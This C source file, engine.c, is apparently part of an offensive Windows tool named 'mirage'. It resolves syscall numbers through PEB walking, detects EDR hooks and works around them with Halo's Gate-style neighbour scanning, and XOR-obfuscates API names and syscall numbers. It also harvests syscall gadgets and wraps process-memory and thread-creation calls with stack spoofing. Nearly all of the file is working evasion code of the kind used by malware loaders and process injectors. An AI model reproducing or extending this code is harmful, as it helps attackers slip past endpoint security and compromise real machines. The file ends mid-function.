/*
 * engine.c — Syscall engine with WinAPI fallback
 *
 * Tries PEB walk for indirect syscalls. If it fails, falls back
 * to standard kernel32.dll / ntdll.dll imports.
 */
#include "engine.h"
#include "hash.h"
#include "peb.h"
#include "export_resolve.h"
#include "config.h"
#include "mirage_asm.h"
#include "enc_strings.h"
#include "stack_spoof.h"
#include <stddef.h>
#include <windows.h>

/* ── State ────────────────────────────────────────────────────── */
static int g_use_fallback = 1;

/* ── PEB-based resolution ─────────────────────────────────────── */

static inline uint32_t r32le(const uint8_t* p) {
    return (uint32_t)p[0]|((uint32_t)p[1]<<8)|
           ((uint32_t)p[2]<<16)|((uint32_t)p[3]<<24);
}

static int hooked(const uint8_t* s) {
    if (s[0]==0xE9) return 1;
    if (s[0]==0xFF && s[1]==0x25) return 1;
    if (s[0]==0xCC) return 1;
    return 0;
}

static uint32_t xssn(const uint8_t* s) {
    if (s[0]==0x4C && s[1]==0x8B && s[2]==0xD1 && s[3]==0xB8)
        return r32le(s+4);
    for (uint32_t i=0; i<12; i++)
        if (s[i]==0xB8 && (i+4)<=0x20) {
            uint32_t c=r32le(s+i+1);
            if (c < 0x500) return c;
        }
    return 0;
}

typedef struct { uintptr_t s; uintptr_t e; } TB;

static int tbounds(void* base, TB* o) {
    uint8_t* bp=(uint8_t*)base;
    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)bp;
    if (dos->e_magic!=IMAGE_DOS_SIGNATURE) return 0;
    uint32_t off=(uint32_t)dos->e_lfanew;
    PIMAGE_NT_HEADERS64 nt=(PIMAGE_NT_HEADERS64)(bp+off);
    if (nt->Signature!=IMAGE_NT_SIGNATURE) return 0;
    uint32_t so=off+sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)
               +nt->FileHeader.SizeOfOptionalHeader;
    PIMAGE_SECTION_HEADER sc=(PIMAGE_SECTION_HEADER)(bp+so);
    for (uint16_t i=0; i<nt->FileHeader.NumberOfSections; i++) {
        if (sc[i].Name[0]=='.' && sc[i].Name[1]=='t' &&
            sc[i].Name[2]=='e' && sc[i].Name[3]=='x' && sc[i].Name[4]=='t') {
            o->s=(uintptr_t)bp+sc[i].VirtualAddress;
            o->e=o->s+sc[i].Misc.VirtualSize;
            return 1;
        }
    }
    return 0;
}

static uint32_t rsn(void* ntdll, uint32_t hash) {
    void* fp=mirage_get_function_by_hash(ntdll, hash);
    if (!fp) return 0;
    const uint8_t* st=(const uint8_t*)fp;
    if (!hooked(st)) return xssn(st);
    TB b;
    if (!tbounds(ntdll, &b)) return 0;
    uintptr_t sa=(uintptr_t)st;
    static const uintptr_t st2[]={0x20,0x28,0x30};
    for (uintptr_t d=1; d<=8; d++) {
        for (uint32_t s=0; s<3; s++) {
            uintptr_t o=d*st2[s];
            uintptr_t fw=sa+o;
            if (fw+0x20<=b.e) {
                const uint8_t* fs=(const uint8_t*)fw;
                if (!hooked(fs)) {
                    uint32_t ns=xssn(fs);
                    if (ns) return ns-(uint32_t)d;
                }
            }
            if (o<=(sa-b.s)) {
                uintptr_t bw=sa-o;
                if (bw>=b.s && bw+0x20<=b.e) {
                    const uint8_t* bs=(const uint8_t*)bw;
                    if (!hooked(bs)) {
                        uint32_t ns=xssn(bs);
                        if (ns) return ns+(uint32_t)d;
                    }
                }
            }
        }
    }
    return 0;
}

static int r1(void* base, uint32_t h, uint32_t* o) {
    uint32_t s=rsn(base, h);
    if (s) { *o=s; return 1; }
    return 0;
}

/* ── Halo's Gate fallback ──────────────────────────────────────── */

static uint32_t resolve_ssn_halo(void* ntdll_base, uint32_t target_hash) {
    void* func = mirage_get_function_by_hash(ntdll_base, target_hash);
    if (!func) return 0;

    uint8_t* bytes = (uint8_t*)func;
    if (bytes[0] == 0xE9 || bytes[0] == 0xFF) return 0;

    uint32_t ssn = xssn(bytes);
    if (ssn && ssn < 0x500) return ssn;

    TB b;
    if (!tbounds(ntdll_base, &b)) return 0;

    for (int dir = -1; dir <= 1; dir += 2) {
        for (uintptr_t offset = 0x20; offset < 0x200; offset += 0x20) {
            uintptr_t addr = (uintptr_t)((intptr_t)func + (intptr_t)dir * (intptr_t)offset);
            if (addr < b.s || addr + 8 >= b.e) continue;
            uint8_t* probe = (uint8_t*)addr;
            if (probe[0]==0x4C && probe[1]==0x8B && probe[2]==0xD1 && probe[3]==0xB8) {
                uint32_t candidate = r32le(probe+4);
                if (candidate > 0x1000 && candidate < 0x2000) {
                    if (ssn) {
                        int64_t diff = (int64_t)candidate - (int64_t)ssn;
                        if (diff > 0 && diff < 50) return candidate;
                    } else {
                        return candidate;
                    }
                }
            }
        }
    }
    return 0;
}

static void obf(void) {
    uint32_t* p[] = {
        &ssn_NtAllocateVirtualMemory, &ssn_NtProtectVirtualMemory,
        &ssn_NtFreeVirtualMemory, &ssn_NtWriteVirtualMemory,
        &ssn_NtClose, &ssn_NtOpenFile, &ssn_NtReadVirtualMemory,
        &ssn_NtCreateSection, &ssn_NtMapViewOfSection,
        &ssn_NtQueryInformationProcess, &ssn_NtCreateFile,
        &ssn_NtWriteFile, &ssn_NtQuerySystemInformation,
        &ssn_NtDelayExecution, &ssn_NtCreateEvent,
        &ssn_NtWaitForSingleObject, &ssn_NtOpenKey,
        &ssn_NtQueryValueKey, &ssn_NtSetInformationProcess,
        &ssn_NtSetInformationFile, &ssn_NtGetContextThread,
        &ssn_NtSetContextThread, &ssn_NtOpenSection,
        &ssn_NtUnmapViewOfSection, &ssn_NtCreateThreadEx,
        &ssn_NtOpenProcess, &ssn_NtResumeThread,
        &ssn_NtSuspendThread, &ssn_NtDeleteFile,
        &ssn_NtFlushInstructionCache, &ssn_NtUserGetSystemMetrics,
    };
    for (uint32_t i=0; i<sizeof(p)/sizeof(p[0]); i++)
        *p[i] ^= ssn_xor_key;
}


int mirage_syscall_resolve(void) {
    /* Generate dynamic SSN XOR key per-run */
    /* Resolve GetTickCount via PEB-walk */
    typedef DWORD (WINAPI *pGetTickCount)(void);
    static pGetTickCount pGT = NULL;
    if (!pGT) {
        char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
        void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
        if (k32) {
            char fn[32];
            enc_decrypt(enc_GetTickCount, ENC_GETTICKCOUNT_LEN, fn);
            pGT = (pGetTickCount)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
        }
    }
    ssn_xor_key = MIRAGE_SEED ^ (uint32_t)(pGT ? pGT() : 0);

    char dll_buf[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll_buf);
    uint32_t h = mirage_encrypted_hash_module(dll_buf);
    void* ntdll = mirage_get_module_by_hash(h);
    if (!ntdll) { g_use_fallback = 1; return 0; }
    mirage_init_native_resolver(ntdll);

    uint32_t hash;
    char fn_buf[32];

    enc_decrypt(enc_NtAllocateVirtualMemory, ENC_NTALLOCATEVIRTUALMEMORY_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtAllocateVirtualMemory))
        ssn_NtAllocateVirtualMemory = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtProtectVirtualMemory, ENC_NTPROTECTVIRTUALMEMORY_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtProtectVirtualMemory))
        ssn_NtProtectVirtualMemory = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtFreeVirtualMemory, ENC_NTFREEVIRTUALMEMORY_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtFreeVirtualMemory))
        ssn_NtFreeVirtualMemory = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtWriteVirtualMemory, ENC_NTWRITEVIRTUALMEMORY_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtWriteVirtualMemory))
        ssn_NtWriteVirtualMemory = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtClose, ENC_NTCLOSE_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtClose))
        ssn_NtClose = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtOpenFile, ENC_NTOPENFILE_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtOpenFile))
        ssn_NtOpenFile = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtReadVirtualMemory, ENC_NTREADVIRTUALMEMORY_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtReadVirtualMemory))
        ssn_NtReadVirtualMemory = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtCreateSection, ENC_NTCREATESECTION_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtCreateSection))
        ssn_NtCreateSection = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtMapViewOfSection, ENC_NTMAPVIEWOFSECTION_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtMapViewOfSection))
        ssn_NtMapViewOfSection = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtQueryInformationProcess, ENC_NTQUERYINFORMATIONPROCESS_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtQueryInformationProcess))
        ssn_NtQueryInformationProcess = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtCreateFile, ENC_NTCREATEFILE_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtCreateFile))
        ssn_NtCreateFile = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtWriteFile, ENC_NTWRITEFILE_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtWriteFile))
        ssn_NtWriteFile = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtQuerySystemInformation, ENC_NTQUERYSYSTEMINFORMATION_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtQuerySystemInformation))
        ssn_NtQuerySystemInformation = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtDelayExecution, ENC_NTDELAYEXECUTION_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtDelayExecution))
        ssn_NtDelayExecution = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtOpenKey, ENC_NTOPENKEY_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtOpenKey))
        ssn_NtOpenKey = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtQueryValueKey, ENC_NTQUERYVALUEKEY_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtQueryValueKey))
        ssn_NtQueryValueKey = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtSetInformationProcess, ENC_NTSETINFORMATIONPROCESS_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtSetInformationProcess))
        ssn_NtSetInformationProcess = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtCreateThreadEx, ENC_NTCREATETHREADEX_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtCreateThreadEx))
        ssn_NtCreateThreadEx = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtOpenProcess, ENC_NTOPENPROCESS_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtOpenProcess))
        ssn_NtOpenProcess = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtFlushInstructionCache, ENC_NTFLUSHINSTRUCTIONCACHE_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtFlushInstructionCache))
        ssn_NtFlushInstructionCache = resolve_ssn_halo(ntdll, hash);

    obf();
    g_use_fallback = 0;
    return 1;
}

int mirage_init_gadget_pool(void) {
    void* ntdll = NULL;
    char dll[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll);
    uint32_t h = mirage_encrypted_hash_module(dll);
    ntdll = mirage_get_module_by_hash(h);
    if (!ntdll) return 0;
    TB b;
    if (!tbounds(ntdll, &b)) return 0;
    const uint8_t* d=(const uint8_t*)b.s;
    uintptr_t len = b.e - b.s;
    uint32_t c = 0;
    for (uintptr_t i=0; i+2<len && c<64; i++)
        if (d[i]==0x0F && d[i+1]==0x05 && d[i+2]==0xC3)
            gadget_pool[c++] = b.s + i;
    if (c==0) return 0;
    for (uint32_t i=c; i<64; i++)
        gadget_pool[i] = gadget_pool[i % c];
    return 1;
}

/* ═══════ Global SSN XOR key (set at runtime) ═══════════════════ */
uint32_t ssn_xor_key = 0xA3B5C7D9;

/* ═══════ XOR-obfuscated export names ══════════════════════════ */

static const unsigned char _NtAllocateVirtualMemory_obf[23] = { 0xe1, 0xd0, 0xf0, 0x04, 0x42, 0x1b, 0xc8, 0xd6, 0x49, 0xf9, 0xe1, 0xf9, 0x56, 0x08, 0xe2, 0x37, 0xc3, 0xe9, 0xd4, 0x05, 0x41, 0x06, 0xd2 };
static const unsigned char _NtProtectVirtualMemory_obf[22] = { 0xe1, 0xd0, 0xe1, 0x1a, 0x41, 0x00, 0xce, 0xd4, 0x49, 0xca, 0xde, 0xe2, 0x50, 0x09, 0xf6, 0x3a, 0xe2, 0xc1, 0xdc, 0x07, 0x5c, 0x0d };
static const unsigned char _NtFreeVirtualMemory_obf[19] = { 0xe1, 0xd0, 0xf7, 0x1a, 0x4b, 0x11, 0xfd, 0xde, 0x4f, 0xe8, 0xc2, 0xf1, 0x48, 0x31, 0xf2, 0x3b, 0xc0, 0xd6, 0xc8 };
static const unsigned char _NtWriteVirtualMemory_obf[20] = { 0xe1, 0xd0, 0xe6, 0x1a, 0x47, 0x00, 0xce, 0xe1, 0x54, 0xee, 0xc3, 0xe5, 0x45, 0x10, 0xda, 0x33, 0xc2, 0xcb, 0xc3, 0x11 };
static const unsigned char _NtReadVirtualMemory_obf[19] = { 0xe1, 0xd0, 0xe3, 0x0d, 0x4f, 0x10, 0xfd, 0xde, 0x4f, 0xe8, 0xc2, 0xf1, 0x48, 0x31, 0xf2, 0x3b, 0xc0, 0xd6, 0xc8 };
static const unsigned char _NtClose_obf[7] = { 0xe1, 0xd0, 0xf2, 0x04, 0x41, 0x07, 0xce };
static const unsigned char _NtQuerySystemInformation_obf[24] = { 0xe1, 0xd0, 0xe0, 0x1d, 0x4b, 0x06, 0xd2, 0xe4, 0x44, 0xef, 0xc3, 0xf5, 0x49, 0x35, 0xf9, 0x30, 0xc0, 0xd6, 0xdc, 0x09, 0x5a, 0x1d, 0xc4, 0xd9 };
static const unsigned char _NtQueryInformationProcess_obf[25] = { 0xe1, 0xd0, 0xe0, 0x1d, 0x4b, 0x06, 0xd2, 0xfe, 0x53, 0xfa, 0xd8, 0xe2, 0x49, 0x1d, 0xe3, 0x3f, 0xc0, 0xca, 0xe1, 0x1a, 0x41, 0x17, 0xce, 0xc4, 0x4e };
static const unsigned char _NtDelayExecution_obf[16] = { 0xe1, 0xd0, 0xf5, 0x0d, 0x42, 0x15, 0xd2, 0xf2, 0x45, 0xf9, 0xd4, 0xe5, 0x50, 0x15, 0xf8, 0x38 };
static const unsigned char _NtOpenFile_obf[10] = { 0xe1, 0xd0, 0xfe, 0x18, 0x4b, 0x1a, 0xed, 0xde, 0x51, 0xf9 };
static const unsigned char _NtWriteFile_obf[11] = { 0xe1, 0xd0, 0xe6, 0x1a, 0x47, 0x00, 0xce, 0xf1, 0x54, 0xf0, 0xd2 };
static const unsigned char _NtSetInformationProcess_obf[23] = { 0xe1, 0xd0, 0xe2, 0x0d, 0x5a, 0x3d, 0xc5, 0xd1, 0x52, 0xee, 0xda, 0xf1, 0x50, 0x15, 0xf8, 0x38, 0xff, 0xd6, 0xde, 0x0b, 0x4b, 0x07, 0xd8 };
static const unsigned char _NtOpenKey_obf[9] = { 0xe1, 0xd0, 0xfe, 0x18, 0x4b, 0x1a, 0xe0, 0xd2, 0x44 };
static const unsigned char _NtQueryValueKey_obf[15] = { 0xe1, 0xd0, 0xe0, 0x1d, 0x4b, 0x06, 0xd2, 0xe1, 0x5c, 0xf0, 0xc2, 0xf5, 0x6f, 0x19, 0xee };
static const unsigned char _NtOpenProcess_obf[13] = { 0xe1, 0xd0, 0xfe, 0x18, 0x4b, 0x1a, 0xfb, 0xc5, 0x52, 0xff, 0xd2, 0xe3, 0x57 };
static const unsigned char _NtCreateThreadEx_obf[16] = { 0xe1, 0xd0, 0xf2, 0x1a, 0x4b, 0x15, 0xdf, 0xd2, 0x69, 0xf4, 0xc5, 0xf5, 0x45, 0x18, 0xd2, 0x2e };
static const unsigned char _NtFlushInstructionCache_obf[23] = { 0xe1, 0xd0, 0xf7, 0x04, 0x5b, 0x07, 0xc3, 0xfe, 0x53, 0xef, 0xc3, 0xe2, 0x51, 0x1f, 0xe3, 0x3f, 0xc0, 0xca, 0xf2, 0x09, 0x4d, 0x1c, 0xce };
static const unsigned char _NtCreateEvent_obf[13] = { 0xe1, 0xd0, 0xf2, 0x1a, 0x4b, 0x15, 0xdf, 0xd2, 0x78, 0xea, 0xd2, 0xfe, 0x50 };
static const unsigned char _NtDeleteFile_obf[12] = { 0xe1, 0xd0, 0xf5, 0x0d, 0x42, 0x11, 0xdf, 0xd2, 0x7b, 0xf5, 0xdb, 0xf5 };
static const unsigned char _NtSetInformationFile_obf[20] = { 0xe1, 0xd0, 0xe2, 0x0d, 0x5a, 0x3d, 0xc5, 0xd1, 0x52, 0xee, 0xda, 0xf1, 0x50, 0x15, 0xf8, 0x38, 0xe9, 0xcd, 0xdd, 0x0d };
static const unsigned char _NtCreateFile_obf[12] = { 0xe1, 0xd0, 0xf2, 0x1a, 0x4b, 0x15, 0xdf, 0xd2, 0x7b, 0xf5, 0xdb, 0xf5 };
static const unsigned char _NtEnumerateKey_obf[14] = { 0xe1, 0xd0, 0xf4, 0x06, 0x5b, 0x19, 0xce, 0xc5, 0x5c, 0xe8, 0xd2, 0xdb, 0x41, 0x05 };
static const unsigned char _ntdll_dll_obf[9] = { 0xc1, 0xd0, 0xd5, 0x04, 0x42, 0x5a, 0xcf, 0xdb, 0x51 };
static void deobf_str(const unsigned char *obf, size_t len, char *out) {
    for (size_t i = 0; i < len; i++)
        out[i] = (char)(obf[i] ^ MIRAGE_STRING_KEY_ENC[i % 16]);
    out[len] = '\0';
}

#define RESOLVE_EXPORT_OBF(arr) resolve_export_obf(arr, sizeof(arr))

typedef NTSTATUS (WINAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG, SIZE_T*, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, SIZE_T*, ULONG, ULONG*);
typedef NTSTATUS (WINAPI *pNtFreeVirtualMemory)(HANDLE, PVOID*, SIZE_T*, ULONG);
typedef NTSTATUS (WINAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, SIZE_T*);
typedef NTSTATUS (WINAPI *pNtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, SIZE_T*);
typedef NTSTATUS (WINAPI *pNtClose)(HANDLE);
typedef NTSTATUS (WINAPI *pNtQuerySystemInformation)(ULONG, PVOID, ULONG, ULONG*);
typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, ULONG*);
typedef NTSTATUS (WINAPI *pNtDelayExecution)(BOOLEAN, LARGE_INTEGER*);
typedef NTSTATUS (WINAPI *pNtOpenFile)(HANDLE*, ULONG, PVOID, PVOID, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pNtWriteFile)(HANDLE, HANDLE, PVOID, PVOID, PVOID, PVOID, ULONG, PVOID, PVOID);
typedef NTSTATUS (WINAPI *pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
typedef NTSTATUS (WINAPI *pNtOpenKey)(HANDLE*, ULONG, PVOID);
typedef NTSTATUS (WINAPI *pNtQueryValueKey)(HANDLE, PVOID, ULONG, PVOID, ULONG, ULONG*);
typedef NTSTATUS (WINAPI *pNtOpenProcess)(HANDLE*, ULONG, PVOID, PVOID);
typedef NTSTATUS (WINAPI *pNtCreateThreadEx)(HANDLE*, ULONG, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (WINAPI *pNtFlushInstructionCache)(HANDLE, PVOID, SIZE_T);
typedef NTSTATUS (WINAPI *pNtCreateEvent)(HANDLE*, ULONG, PVOID, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pNtDeleteFile)(PVOID);
typedef NTSTATUS (WINAPI *pNtSetInformationFile)(HANDLE, PVOID, PVOID, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pNtCreateFile)(HANDLE*, ULONG, PVOID, PVOID, PVOID, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);

static void* ntdll_via_peb(void) {
    char dll[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll); return mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
}

static void* resolve_export_obf(const unsigned char *obf, size_t len) {
    void *ntdll = ntdll_via_peb();
    if (!ntdll) return NULL;
    char name[128];
    deobf_str(obf, (len < sizeof(name)) ? len : (sizeof(name) - 1), name);
    return mirage_get_function_by_hash(ntdll, mirage_encrypted_hash_func(name));
}
NTSTATUS mirage_NtAllocateVirtualMemory(HANDLE a, PVOID* b, ULONG c, SIZE_T* d, ULONG e, ULONG f) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtAllocateVirtualMemory_stub,
                (uint64_t)a, (uint64_t)b, c, (uint64_t)d, e, f, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtAllocateVirtualMemory_stub((uint64_t)a,(uint64_t)b,c,(uint64_t)d,e,f);
    }
    static pNtAllocateVirtualMemory fn = NULL;
    if (!fn) fn = (pNtAllocateVirtualMemory)resolve_export_obf(_NtAllocateVirtualMemory_obf, sizeof(_NtAllocateVirtualMemory_obf));
    return fn ? fn(a,b,c,d,e,f) : -1;
}

NTSTATUS mirage_NtProtectVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d, ULONG* e) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtProtectVirtualMemory_stub,
                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, (uint64_t)e, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtProtectVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
    }
    static pNtProtectVirtualMemory fn = NULL;
    if (!fn) fn = (pNtProtectVirtualMemory)resolve_export_obf(_NtProtectVirtualMemory_obf, sizeof(_NtProtectVirtualMemory_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtFreeVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtFreeVirtualMemory_stub,
                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtFreeVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d);
    }
    static pNtFreeVirtualMemory fn = NULL;
    if (!fn) fn = (pNtFreeVirtualMemory)resolve_export_obf(_NtFreeVirtualMemory_obf, sizeof(_NtFreeVirtualMemory_obf));
    return fn ? fn(a,b,c,d) : -1;
}

NTSTATUS mirage_NtWriteVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_T* e) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtWriteVirtualMemory_stub,
                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, (uint64_t)e, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtWriteVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
    }
    static pNtWriteVirtualMemory fn = NULL;
    if (!fn) fn = (pNtWriteVirtualMemory)resolve_export_obf(_NtWriteVirtualMemory_obf, sizeof(_NtWriteVirtualMemory_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtReadVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_T* e) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtReadVirtualMemory_stub,
                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, (uint64_t)e, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtReadVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
    }
    static pNtReadVirtualMemory fn = NULL;
    if (!fn) fn = (pNtReadVirtualMemory)resolve_export_obf(_NtReadVirtualMemory_obf, sizeof(_NtReadVirtualMemory_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtClose(HANDLE a) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtClose_stub,
                (uint64_t)a, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtClose_stub((uint64_t)a);
    }
    static pNtClose fn = NULL;
    if (!fn) fn = (pNtClose)resolve_export_obf(_NtClose_obf, sizeof(_NtClose_obf));
    return fn ? fn(a) : -1;
}

NTSTATUS mirage_NtQuerySystemInformation(ULONG a, PVOID b, ULONG c, ULONG* d) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtQuerySystemInformation_stub,
                a, (uint64_t)b, c, (uint64_t)d, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtQuerySystemInformation_stub(a,(uint64_t)b,c,(uint64_t)d);
    }
    static pNtQuerySystemInformation fn = NULL;
    if (!fn) fn = (pNtQuerySystemInformation)resolve_export_obf(_NtQuerySystemInformation_obf, sizeof(_NtQuerySystemInformation_obf));
    return fn ? fn(a,b,c,d) : -1;
}

NTSTATUS mirage_NtQueryInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d, ULONG* e) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtQueryInformationProcess_stub,
                (uint64_t)a, b, (uint64_t)c, d, (uint64_t)e, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtQueryInformationProcess_stub((uint64_t)a,b,(uint64_t)c,d,(uint64_t)e);
    }
    static pNtQueryInformationProcess fn = NULL;
    if (!fn) fn = (pNtQueryInformationProcess)resolve_export_obf(_NtQueryInformationProcess_obf, sizeof(_NtQueryInformationProcess_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtDelayExecution(BOOLEAN a, LARGE_INTEGER* b) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtDelayExecution_stub,
                a, (uint64_t)b, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtDelayExecution_stub(a,(uint64_t)b);
    }
    static pNtDelayExecution fn = NULL;
    if (!fn) fn = (pNtDelayExecution)resolve_export_obf(_NtDelayExecution_obf, sizeof(_NtDelayExecution_obf));
    return fn ? fn(a,b) : -1;
}

NTSTATUS mirage_NtCreateFile(HANDLE* a, ULONG b, PVOID c, PVOID d, PVOID e, ULONG f, ULONG g, ULONG h, ULONG i, PVOID j, ULONG k) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtCreateFile_stub,
                (uint64_t)a, b, (uint64_t)c, (uint64_t)d, (uint64_t)e, f, g, h, i, (uint64_t)j, k);
        }
        return (NTSTATUS)NtCreateFile_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,(uint64_t)e,f,g,h,i,(uint64_t)j,k);
    }
    static pNtCreateFile fn = NULL;
    if (!fn) fn = (pNtCreateFile)resolve_export_obf(_NtCreateFile_obf, sizeof(_NtCreateFile_obf));
    return fn ? fn(a,b,c,d,e,f,g,h,i,j,k) : -1;
}

NTSTATUS mirage_NtOpenFile(HANDLE* a, ULONG b, PVOID c, PVOID d, ULONG e, ULONG f) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtOpenFile_stub,
                (uint64_t)a, b, (uint64_t)c, (uint64_t)d, e, f, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtOpenFile_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,e,f);
